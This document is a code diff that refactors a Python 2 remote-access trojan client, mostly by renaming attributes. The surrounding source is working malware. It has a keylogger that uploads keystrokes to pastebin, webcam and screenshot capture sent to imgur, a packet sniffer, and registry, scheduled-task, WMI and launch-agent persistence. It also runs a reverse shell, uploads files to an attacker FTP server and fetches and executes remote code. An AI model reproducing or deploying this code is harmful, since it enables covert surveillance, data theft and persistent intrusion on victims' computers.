@@ -83,43 +83,40 @@ class Client(object):
     
     global __modules__
     global __command__
+
     __command__ = {}
     __modules__ = {}
-    
-    def __init__(self, *args, **kwargs):
+
+    def __init__(self, **kwargs):
         self._setup(**kwargs)
-        self.mode       = 0
-        self.exit       = 0
-        self.threads    = {}
-        self.info       = self._info()
-        self.logger     = self._logger()
-        self.modules    = self._modules()
-        self.commands   = self._commands()
-        self.result     = self._result()
+        self._mode       = 0
+        self._exit       = 0
+        self._threads    = {}
+        self._info       = self._get_info()
+        self._logger     = self._get_logger()
+        self._result     = self._get_framework()
+        self._modules    = {mod: getattr(self, mod) for mod in __modules__}
+        self._commands   = {cmd: getattr(self, cmd) for cmd in __command__}
 
-# ----------------- private/worker functions --------------------------
-
-    def _modules(self): return {mod: getattr(self, mod) for mod in __modules__}
+    # private worker functions
 
     def _wget(self, target): return urlretrieve(target)[0]
     
     def _cat(self,filename): return open(filename).read(4000) 
     
-    def _ls(self, *path): return '\n'.join(os.listdir(path[0])) if path else '\n'.join(os.listdir('.'))
-
-    def _result(self): return {module:{} for module in self.modules}
-
     def _unzip(self, fname): return ZipFile(fname).extractall('.')
 
-    def _pad(self, s): return s + (AES.block_size - len(bytes(s)) % AES.block_size) * b'\0'
-
-    def _commands(self): return {cmd: getattr(self, cmd) for cmd in __command__}
+    def _get_framework(self): return {module:{} for module in self._modules}
     
     def _cd(self, path): return os.chdir(path) if os.path.isdir(path) else os.chdir('.')
 
+    def _pad(self, s): return s + (AES.block_size - len(bytes(s)) % AES.block_size) * b'\0'
+
+    def _ls(self, *path): return '\n'.join(os.listdir(path[0])) if path else '\n'.join(os.listdir('.'))
+
     def _setup(self, **kwargs): return [setattr(self, '__{}__'.format(chr(i)), kwargs.get('__{}__'.format(chr(i)))) for i in range(97,123) if '__{}__'.format(chr(i)) in kwargs]
 
-    def _info(self): return {'IP Address': self._ip(),'Platform': sys.platform,'Localhost': socket.gethostbyname(socket.gethostname()),'MAC Address': '-'.join(uuid1().hex[20:].upper()[i:i+2] for i in range(0,11,2)),'Login': os.getenv('USERNAME') if os.name is 'nt' else os.getenv('USER'),'Machine': os.getenv('COMPUTERNAME') if os.name is 'nt' else os.getenv('NAME'),'Admin': bool(windll.shell32.IsUserAnAdmin()) if os.name is 'nt' else bool(os.getuid() == 0),'Device': subprocess.check_output('VER',shell=True).replace('\n','') if os.name is 'nt' else subprocess.check_output('uname -a', shell=True).rstrip()}
+    def _get_info(self): return {'IP Address': self._ip(),'Platform': sys.platform,'Localhost': socket.gethostbyname(socket.gethostname()),'MAC Address': '-'.join(uuid1().hex[20:].upper()[i:i+2] for i in range(0,11,2)),'Login': os.getenv('USERNAME') if os.name is 'nt' else os.getenv('USER'),'Machine': os.getenv('COMPUTERNAME') if os.name is 'nt' else os.getenv('NAME'),'Admin': bool(windll.shell32.IsUserAnAdmin()) if os.name is 'nt' else bool(os.getuid() == 0),'Device': subprocess.check_output('VER',shell=True).replace('\n','') if os.name is 'nt' else subprocess.check_output('uname -a', shell=True).rstrip()}
 
     def _get(self, target): return getattr(self, target)() if target in ['jobs','results','options','status','commands','modules','info'] else '\n'.join(["usage: {:>16}".format("'get <option>'"), "options: {}".format("'jobs','results','options','status','commands','modules','info'")]) 
   
@@ -127,14 +124,14 @@ class Client(object):
 
     def _persistence(self):
         result = {}
-        for method in self.persistence.options['methods']:
-            if method not in self.result['persistence']:
+        for method in self.persistence.options:
+            if method not in self._result['persistence']:
                 try:
                     function = '_persistence_add_{}_{}'.format(*method.split())
                     result[method] = getattr(self, function)()
                 except Exception as e:
                     result[method] = str(e)
-        self.result['persistence'].update(result)
+        self._result['persistence'].update(result)
         return result
 
     def _screenshot(self):
@@ -142,28 +139,28 @@ class Client(object):
         with mss() as screen:
             img = screen.shot(output=tmp)
         result = self._imgur(img)
-        self.result['screenshot'].update({ time.ctime() : result })
+        self._result['screenshot'].update({ time.ctime() : result })
         return result
 
 
     def _keylogger(self):
-        self.threads['keylogger'] = Thread(target=self._keylogger_manager, name=time.time())
-        self.threads['keylogger'].start()
+        self._threads['keylogger'] = Thread(target=self._keylogger_manager, name=time.time())
+        self._threads['keylogger'].start()
         result = 'Keylogger started at {}'.format(time.ctime())
-        self.result['keylogger'].update({ time.ctime() : result })
+        self._result['keylogger'].update({ time.ctime() : result })
         return result
 
     def _webcam(self):
         if self.webcam.options['video']:
-            if 'video' not in self.result['webcam']:
-                self.result['webcam'].update({'video': {}})
+            if 'video' not in self._result['webcam']:
+                self._result['webcam'].update({'video': {}})
             result = self._webcam_video()
-            self.result['webcam']['video'][time.ctime()] = result
+            self._result['webcam']['video'][time.ctime()] = result
         else:
-            if 'image' not in self.result['webcam']:
-                self.result['webcam'].update({'image': {}})
+            if 'image' not in self._result['webcam']:
+                self._result['webcam'].update({'image': {}})
             result = self._webcam_image()
-            self.result['webcam']['image'][time.ctime()] = result
+            self._result['webcam']['image'][time.ctime()] = result
         return result
 
     def _packetsniffer(self):
@@ -171,7 +168,7 @@ class Client(object):
             result  = self._packetsniffer_manager(self.packetsniffer.options['seconds'])
         except Exception as e:
             result  = 'Error monitoring network traffic: {}'.format(str(e))
-        self.result['packetsniffer'].update({ time.ctime() : result })
+        self._result['packetsniffer'].update({ time.ctime() : result })
         return result
 
     def _hidden_process(self, path, shell=False):
@@ -219,7 +216,7 @@ class Client(object):
     def _receive(self):
         try:
             data = ""
-            self.socket.setblocking(False) if self.mode else self.socket.setblocking(True)
+            self.socket.setblocking(False) if self._mode else self.socket.setblocking(True)
             while "\n" not in data:
                 try:
                     data += self.socket.recv(1024)
@@ -266,7 +263,7 @@ class Client(object):
             calc_hmac   = HMAC.new(self.dhkey[16:], msg=ciphertext[:-SHA256.digest_size], digestmod=SHA256).digest()
             output      = cipher.decrypt(ciphertext[len(iv):-SHA256.digest_size])
             if check_hmac != calc_hmac:
-                self.logger.log(40, 'HMAC-SHA256 hash authentication check failed - transmission may have been compromised', extra={'submodule': self.name})
+                self._logger.log(40, 'HMAC-SHA256 hash authentication check failed - transmission may have been compromised', extra={'submodule': self.name})
             return output.rstrip(b'\0')
         except Exception as e:
             if self.__v__:
@@ -307,13 +304,13 @@ class Client(object):
 
     def _kill(self):
         try:
-            self.exit = True
-            for i in self.threads:
+            self._exit = True
+            for i in self._threads:
                 try:
-                    t = self.threads.pop(i)
+                    t = self._threads.pop(i)
                     del t
                 except: pass
-            for method in self.persistence.options['methods']:
+            for method in self.persistence.options:
                 try:
                     target = 'remove_{}_{}_persistence'.format(*method.split())
                     getattr(self, target)()
@@ -369,34 +366,30 @@ class Client(object):
     def _options(self, *module):
         try:
             if not module:
-                modlist = [_ for _ in self.modules]
+                modlist = [_ for _ in self._modules]
             else:
                 module = module[0]
-                if module not in self.modules:
+                if module not in self._modules:
                     return "'{}' is not a module".format(str(module))
                 else:
                     modlist = [module]
-            return self._show({m: self.modules[m].options for m in modlist})
+            return self._show({m: self._modules[m].options for m in modlist})
         except Exception as e:
             return 'Option error: {}'.format(str(e))
             
 
     def _show(self, target):
-        if target in ('commands','modules','jobs'):
-            results  = '\n'.join([i for i in getattr(self, target)])
-        else:
-            dict_or_json = getattr(self, target) if type(target) is str else target
+        try:
+            results = json.dumps(dict_or_json, indent=2, separators=(',',': '), sort_keys=True)
+        except:
             try:
-                results = json.dumps(dict_or_json, indent=2, separators=(',',': '), sort_keys=True)
+                string_repr = repr(dict_or_json)
+                string_repr = string_repr.replace('None', 'null').replace('True', 'true').replace('False', 'false').replace("u'", "'").replace("'", '"')
+                string_repr = re.sub(r':(\s+)(<[^>]+>)', r':\1"\2"', string_repr)
+                string_repr = string_repr.replace('(', '[').replace(')', ']')
+                results     = json.dumps(json.loads(string_repr), indent=2, separators=(', ', ': '), sort_keys=True)
             except:
-                try:
-                    string_repr = repr(dict_or_json)
-                    string_repr = string_repr.replace('None', 'null').replace('True', 'true').replace('False', 'false').replace("u'", "'").replace("'", '"')
-                    string_repr = re.sub(r':(\s+)(<[^>]+>)', r':\1"\2"', string_repr)
-                    string_repr = string_repr.replace('(', '[').replace(')', ']')
-                    results     = json.dumps(json.loads(string_repr), indent=2, separators=(', ', ': '), sort_keys=True)
-                except:
-                    results = repr(dict_or_json)
+                results = repr(dict_or_json)
         return results
 
     def _ip(self):
@@ -409,7 +402,7 @@ class Client(object):
             except: pass
 
     def _admin(self):
-        info = self._info()
+        info = self._get_info()
         if info['Admin']:
             return {'User': info['login'], 'Administrator': info['admin']}
         if self.__f__:
@@ -440,7 +433,7 @@ class Client(object):
             source  = request('GET', uri).content
             code    = compile(source, name, 'exec')
             exec code in module.__dict__
-            self.modules[name] = module
+            self._modules[name] = module
             return module
         except Exception as e:
             if self.__v__:
@@ -460,7 +453,7 @@ class Client(object):
             if self.__v__:
                 print 'Powershell error: {}'.format(str(e))
 
-    def _logger(self, port=4321):
+    def _get_logger(self, port=4321):
         module_logger = getLogger(self._ip())
         module_logger.handlers = []
         socket_handler = SocketHandler(self._target(o=long(self.__a__), p=long(self.__b__)), port)
@@ -481,29 +474,29 @@ class Client(object):
     def _ftp(self, filepath):
         try:
             host = FTP(*long_to_bytes(self.__q__).split())
-            if self.info.get('IP Address') not in host.nlst('/htdocs'):
-                host.mkd('/htdocs/{}'.format(self.info.get('IP Address')))
-            result = '/htdocs/{}/{}'.format(self.info.get('IP Address'), os.path.basename(filepath))
+            if self._info.get('IP Address') not in host.nlst('/htdocs'):
+                host.mkd('/htdocs/{}'.format(self._info.get('IP Address')))
+            result = '/htdocs/{}/{}'.format(self._info.get('IP Address'), os.path.basename(filepath))
             upload = host.storbinary('STOR ' + result, open(filepath, 'rb'))
         except Exception as e:
             result = str(e)
         return result
 
     def _run_modules(self):
-        for name, module in self.modules.items():
-             if module.status and sys.platform in module.platforms and name not in self.threads:
-                self.threads[name] = Thread(target=module, name=name)
-        for worker in self.threads.values():
+        for name, module in self._modules.items():
+             if module.status and sys.platform in module.platforms and name not in self._threads:
+                self._threads[name] = Thread(target=module, name=name)
+        for worker in self._threads.values():
             if not worker.is_alive():
                 worker.start()
-        for task, worker in self.threads.items():
+        for task, worker in self._threads.items():
             if task not in ('keylogger','packetsniffer'):
                 worker.join()
-        return self._show(self.result)
+        return self._show(self._result)
 
     def _shell(self):
         while True:
-            if self.mode:
+            if self._mode:
                 break
             prompt = "[%d @ {}]> ".format(os.getcwd())
             self._send(prompt, method='prompt')   
@@ -523,12 +516,12 @@ class Client(object):
     def _standby(self):
         self.standby.next_run = time.time() + 300
         while True:
-            if self.mode:
+            if self._mode:
                 if time.time() > self.standby.next_run:
                     self.run()
                 time.sleep(1)
                 b = self._receive()
-                self.mode = 0 if b else 1
+                self._mode = 0 if b else 1
             else:
                 break
         return self.shell()
@@ -538,9 +531,9 @@ class Client(object):
             self.socket  = self._connect(host=self._target(o=self.__a__, p=self.__b__))
             self.dhkey   = self._diffiehellman()
             while True:
-                if self.exit:
+                if self._exit:
                     break
-                elif self.mode:
+                elif self._mode:
                     self.standby()
                 else:
                     self.shell()
@@ -566,13 +559,13 @@ class Client(object):
         
     def _keylogger_helper(self):
         while True:
-            if self.exit:
+            if self._exit:
                 if len(self.keylogger.options['buffer']):
                     result  = self._pastebin(self.keylogger.options['buffer'])
-                    if self.mode:
-                        self.logger.log(40, result, extra={'submodule':'keylogger'})
+                    if self._mode:
+                        self._logger.log(40, result, extra={'submodule':'keylogger'})
                     else:
-                        self.result['keylogger'].update({time.ctime(): result})
+                        self._result['keylogger'].update({time.ctime(): result})
                 break
             if self.keylogger.options['next_upload'] > 0:
                 self.keylogger.options['next_upload'] = float(self.keylogger.options['next_upload'] - 1.0)
@@ -580,18 +573,18 @@ class Client(object):
             else:
                 if len(self.keylogger.options['buffer']) > self.keylogger.options['max_bytes']:
                     result  = self._pastebin(self.keylogger.options['buffer'])
-                    if self.mode:
-                        self.logger.log(40, result, extra={'submodule':'keylogger'})
+                    if self._mode:
+                        self._logger.log(40, result, extra={'submodule':'keylogger'})
                     else:
-                        self.result['keylogger'].update({time.ctime(): result})
+                        self._result['keylogger'].update({time.ctime(): result})
                     self.keylogger.options['buffer']  = ''
                 self.keylogger.options['next_upload'] = 300.0
 
     def _keylogger_manager(self):
-            self.threads['keylogger_helper'] = Thread(target=self._keylogger_helper, name=time.time())
-            self.threads['keylogger_helper'].start()
+            self._threads['keylogger_helper'] = Thread(target=self._keylogger_helper, name=time.time())
+            self._threads['keylogger_helper'].start()
             while True:
-                if self.exit:
+                if self._exit:
                     break
                 hm = HookManager()
                 hm.KeyDown = self._keylogger_event
@@ -773,7 +766,7 @@ class Client(object):
             sniffer_socket.close()
         except: pass
         result = self._pastebin('\n'.join(self.packetsniffer.options['buffer']))
-        self.result['packetsniffer'][time.ctime()] = result
+        self._result['packetsniffer'][time.ctime()] = result
         self.packetsniffer.options['buffer'] = []
         return result
 
@@ -916,7 +909,7 @@ class Client(object):
             fileobj = file(fpath, 'w')
             fileobj.write(bash)
             fileobj.close()
-            self.result['persistence']['launch agent'] = '~/Library/LaunchAgents/{}.plist'.format(label)
+            self._result['persistence']['launch agent'] = '~/Library/LaunchAgents/{}.plist'.format(label)
             bin_sh  = bytes().join(subprocess.Popen('/bin/sh {}'.format(x), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
             return True
         except Exception as e2:
@@ -939,7 +932,7 @@ class Client(object):
     def _module(fx, cx=__command__, mx=__modules__):
         if fx.func_name is 'persistence':
             fx.platforms = ['win32','darwin']
-            fx.options = {'methods': ['registry key', 'scheduled task', 'wmi object', 'startup file', 'hidden file'] if os.name is 'nt' else ['launch agent', 'hidden file']}
+            fx.options = {'registry key':True, 'scheduled task':True, 'wmi object':True, 'startup file':True, 'hidden file':True} if os.name is 'nt' else {'launch agent':True, 'hidden file':True}
 
         elif fx.func_name is 'keylogger':
             fx.platforms = ['win32','darwin','linux2']
@@ -1003,7 +996,7 @@ class Client(object):
     def wget(self, target): return self._wget()
 
     @_command
-    def jobs(self): return self._show(self.threads)
+    def jobs(self): return self._show(self._threads)
     
     @_command
     def use(self, module): return self._use(module)
@@ -1012,7 +1005,7 @@ class Client(object):
     def stop(self, module): return self._stop(module)
 
     @_command
-    def results(self): return self._show(self.result)
+    def results(self): return self._show(self._result)
     
     @_module
     def persistence(self): return self._persistence()
